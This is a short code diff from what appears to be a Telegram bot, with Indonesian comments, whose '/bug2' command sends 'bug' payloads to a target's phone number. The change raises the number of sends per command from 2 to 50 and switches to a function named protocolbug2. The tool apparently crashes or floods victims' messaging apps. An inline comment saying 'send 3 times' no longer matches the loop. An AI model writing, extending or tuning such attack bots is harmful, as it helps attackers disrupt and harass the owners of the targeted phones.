@@ -2900,8 +2900,8 @@ bot.onText(/\/bug2(?:\s(.+))?/, async (msg, match) => {
     });
 
     // Proses pengiriman bug
-    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
-        await VampDelayInvis(formatedNumber);
+    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
+        await protocolbug2(formatedNumber);
     }
 
     // Kirim notifikasi setelah selesai dengan gambar lain
